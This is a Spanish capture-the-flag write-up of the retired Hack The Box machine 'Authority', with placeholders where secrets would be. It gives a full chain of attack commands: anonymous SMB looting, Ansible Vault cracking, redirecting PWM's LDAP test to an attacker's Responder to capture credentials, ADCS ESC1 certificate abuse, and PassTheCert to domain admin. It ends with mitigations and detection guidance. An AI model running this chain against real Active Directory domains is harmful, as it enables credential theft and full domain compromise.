---
machine: Authority
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / Active Directory
state: Retired
tags: [windows, active-directory, smb, ansible-vault, pwm, ldap, adcs, esc1, passthecert]
---

# Authority — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired según writeups públicos; no comprobado con sesión en HTB.
> Ficha de método: sin flags ni credenciales reales.

## TL;DR

Controlador de dominio `authority.htb` con un share `Development` legible sin autenticación. Dentro hay un repositorio de Ansible con tres secretos de Ansible Vault; la contraseña del vault cae con `rockyou` y abre el gestor **PWM** del puerto 8443. Desde el editor de configuración se cambia la URL LDAP de la prueba de conexión hacia un Responder propio y PWM entrega en claro las credenciales de `svc_ldap`. Esa cuenta tiene WinRM y permite enumerar ADCS: la plantilla `CorpVPN` es **ESC1** y admite inscripción de `Domain Computers`. Con `MachineAccountQuota=10` se crea un equipo, se pide un certificado con UPN de Administrator y, como el DC no soporta PKINIT, se usa **PassTheCert** sobre LDAP para añadir `svc_ldap` a `Administrators` y obtener SYSTEM con `psexec`.

## Reconocimiento

```bash
nmap -p- --min-rate 3000 -T4 -Pn -oA nmap_all <IP>
nmap -p53,80,88,135,139,389,445,464,636,3268,3269,5985,8443,9389 -sCV -Pn -oA nmap_svc <IP>
```

```text
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0 (página por defecto)
88/tcp    kerberos-sec  Microsoft Windows Kerberos
389/tcp   ldap          AD LDAP (Domain: authority.htb)
445/tcp   microsoft-ds
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
5985/tcp  http          WinRM
8443/tcp  ssl/http      Apache Tomcat
9389/tcp  mc-nmf
```

- La tríada 88/389/3268 confirma un **Domain Controller**; el dominio es `authority.htb`.
- El 8443 no es AD: es la aplicación **PWM** sobre Tomcat, y será la puerta de entrada.
- El certificado de LDAPS está firmado por `AUTHORITY-CA`: hay ADCS en el dominio.
- El certificado de Tomcat tiene como CN una IP privada (`172.16.2.118`), señal de un despliegue clonado sin regenerar certificados.

```bash
printf '%s\n' '<IP> authority.htb authority.authority.htb AUTHORITY' | sudo tee -a /etc/hosts
```

## Enumeración

### SMB anónimo

El servidor permite sesión nula y el share `Development` es legible por invitado:

```bash
netexec smb authority.htb -u guest -p '' --shares
smbclient -N //authority.htb/Development
```

```text
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

La descarga deja un árbol `Automation/Ansible/` con roles `ADCS`, `LDAP`, `PWM` y `SHARE`. El fichero que interesa es:

```text
Development/Automation/Ansible/PWM/defaults/main.yml
```

Contiene tres valores cifrados con Ansible Vault:

```yaml
pwm_admin_login: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
pwm_admin_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
ldap_admin_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  ...
```

### Del vault a PWM

Cada bloque se guarda en su propio fichero (cabecera `$ANSIBLE_VAULT` incluida) y se convierte al formato de Hashcat:

```bash
ansible2john pwm_admin_login.vault > hashes.txt
ansible2john pwm_admin_password.vault >> hashes.txt
hashcat -m 16900 hashes.txt /usr/share/wordlists/rockyou.txt
```

Las tres entradas comparten la misma contraseña de vault, `<PASS_VAULT>`. Se descifran una a una:

```bash
ansible-vault decrypt pwm_admin_login.vault
ansible-vault decrypt pwm_admin_password.vault
```

Credenciales recuperadas (en placeholder):

```text
pwm_admin_login    = svc_pwm
pwm_admin_password = <PASS_PWM>
ldap_admin_password = <PASS_LDAP_VAULT>
```

`svc_pwm` no sirve en el login normal de PWM, pero sí en el **Configuration Manager** de `https://authority.htb:8443/pwm/`. Desde allí se descarga `PwmConfiguration.xml`, que referencia la cuenta `CN=svc_ldap` usada por la aplicación para autenticarse contra LDAP.

## Foothold

### Captura de la credencial LDAP

En el **Configuration Editor**, dentro de `LDAP > LDAP Directories > default > Connection`, se puede editar la URL del servidor LDAP y pulsar **Test LDAP Profile**. PWM descifra la contraseña almacenada y hace un bind contra la URL indicada.

Se apunta a la máquina atacante:

```text
ldap://<LHOST>:389
```

Con Responder escuchando:

```bash
sudo responder -I tun0
```

Al pulsar la prueba, PWM se conecta en claro y entrega las credenciales de la cuenta de servicio:

```text
svc_ldap:<PASS_SVC_LDAP>
```

No es un fallo de LDAP: es una aplicación que permite cambiar el destino de una prueba de credenciales y no valida el canal. La cuenta tiene acceso a **WinRM**:

```bash
evil-winrm -i authority.htb -u svc_ldap -p '<PASS_SVC_LDAP>'
```

Con esa sesión se lee la flag de usuario.

## Escalada de privilegios

### ADCS: plantilla CorpVPN (ESC1)

```bash
certipy-ad find -u svc_ldap -p '<PASS_SVC_LDAP>' -target authority.htb -text -stdout -vulnerable
```

Salida relevante:

```text
CA Name: AUTHORITY-CA
Template Name: CorpVPN
Client Authentication: True
Enrollee Supplies Subject: True
Enrollment Rights: AUTHORITY.HTB\Domain Computers
Vulnerability: ESC1
```

La plantilla permite que el solicitante aporte el **subject/SAN** y admite autenticación de cliente. Como el derecho de inscripción lo tiene `Domain Computers`, no hace falta un usuario privilegiado: basta con crear una cuenta de equipo.

### Cuenta de máquina y certificado

```bash
netexec ldap authority.htb -u svc_ldap -p '<PASS_SVC_LDAP>' -M maq
```

`MachineAccountQuota` vale 10. Se crea un equipo por LDAPS (la escritura por LDAP simple está restringida):

```bash
addcomputer.py 'authority.htb/svc_ldap' -method LDAPS \
  -computer-name '<MACHINE>' -computer-pass '<PASS_MACHINE>' \
  -dc-ip <IP>
```

Con el equipo creado se pide un certificado cuyo UPN sea el de Administrator:

```bash
certipy-ad req -u '<MACHINE>$@authority.htb' -p '<PASS_MACHINE>' \
  -ca AUTHORITY-CA -dc-ip <IP> -template CorpVPN \
  -upn administrator@authority.htb
```

El resultado es `administrator.pfx`. La tentación es autenticarse con Kerberos:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
```

```text
KDC_ERR_PADATA_TYPE_NOSUPP
```

El certificado es válido, pero el DC no tiene certificado de KDC para PKINIT. El error no invalida el certificado: cambia el canal de autenticación.

### PassTheCert sobre LDAP

Se separa el PFX en clave y certificado:

```bash
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
```

PassTheCert usa el certificado para autenticarse por **Schannel/LDAPS** y abrir una shell LDAP:

```bash
git clone https://github.com/AlmondOffSec/PassTheCert
cd PassTheCert/Python
python3 passthecert.py -action ldap-shell \
  -crt ../../administrator.crt -key ../../administrator.key \
  -domain authority.htb -dc-ip <IP>
```

Dentro de la shell:

```text
add_user_to_group svc_ldap administrators
```

Eso añade `svc_ldap` al grupo `Administrators` del DC (`BUILTIN\Administrators`). Como la cuenta ya tenía WinRM, ahora puede ejecutar como administrador:

```bash
psexec.py 'svc_ldap:<PASS_SVC_LDAP>@authority.htb'
```

```text
nt authority\system
```

Con SYSTEM se lee la flag de root.

## Evidencia

- Salida de `nmap` con DC, 8443 y 5985.
- `netexec smb ... --shares` mostrando `Development` como lectura para invitado.
- `main.yml` con los tres bloques `!vault` (valores recortados).
- `hashcat -m 16900` y `ansible-vault decrypt` con la contraseña redactada.
- Captura de Responder con `svc_ldap` y contraseña redactada.
- `certipy-ad find` mostrando `CorpVPN` y `ESC1`.
- `addcomputer.py` y `certipy-ad req` con el UPN de Administrator.
- `KDC_ERR_PADATA_TYPE_NOSUPP` y la shell de PassTheCert.
- `psexec.py` con `nt authority\system`, sin flags reales.

## Lecciones aprendidas

- Un share de desarrollo puede contener la automatización completa de la infraestructura; los secretos cifrados solo son tan fuertes como la contraseña del vault.
- `ansible2john` + Hashcat modo 16900 convierte un vault en un hash offline; un vault con `rockyou` no protege nada.
- Una prueba de conexión saliente es una fuga de credenciales si el destino es editable: el fallo está en la aplicación, no en LDAP.
- ESC1 no siempre lo explota un usuario: si la plantilla permite inscribirse a `Domain Computers`, una cuenta de equipo recién creada sirve.
- `KDC_ERR_PADATA_TYPE_NOSUPP` no significa que el certificado sea inútil; PassTheCert lo reutiliza por LDAPS.
- Añadir la cuenta a `Administrators` y usar `psexec` evita depender de DCSync o de un inicio de sesión interactivo.

## Mitigaciones y detección

- Cerrar la sesión nula/guest de SMB y restringir `Development` a los grupos que lo necesiten; no guardar automatización con secretos en shares legibles.
- Rotar la contraseña del vault y usar un gestor de secretos con auditoría; no reutilizar la contraseña entre entradas.
- En PWM, validar la URL LDAP contra una lista permitida, exigir LDAPS y no permitir que un usuario de configuración apunte a un host arbitrario.
- En ADCS, quitar `Supply in the request` de `CorpVPN`, exigir aprobación del manager o firmas autorizadas, y limitar la inscripción a grupos concretos.
- Reducir `MachineAccountQuota` a 0 si no se necesita; monitorizar la creación de cuentas de equipo.
- Detección: lecturas anómalas del share `Development` (5140/5145); autenticaciones LDAP salientes de PWM; binds LDAP con cuentas de servicio desde hosts no habituales (4624/4625, 4768/4769); cambios en plantillas (5136); solicitudes e emisiones de certificados (4886/4887); altas en `Administrators` (4728/4732); creación de servicios por `psexec` (7045).
- Revisar plantillas con `certipy-ad find -vulnerable`, Defender for Identity y las recomendaciones de Microsoft para ESC1.

MITRE: T1552.001, T1078.002, T1087.002, T1649, T1021.006, T1021.002.

## Referencias

- <https://thehacksparrow.com/authority>
- <https://archwarden.com/writeups/htb-authority>
- <https://specterops.io/blog/2021/06/17/certified-pre-owned>
- <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1>
- <https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers>
- <https://github.com/AlmondOffSec/PassTheCert>
- <https://github.com/ly4k/Certipy>
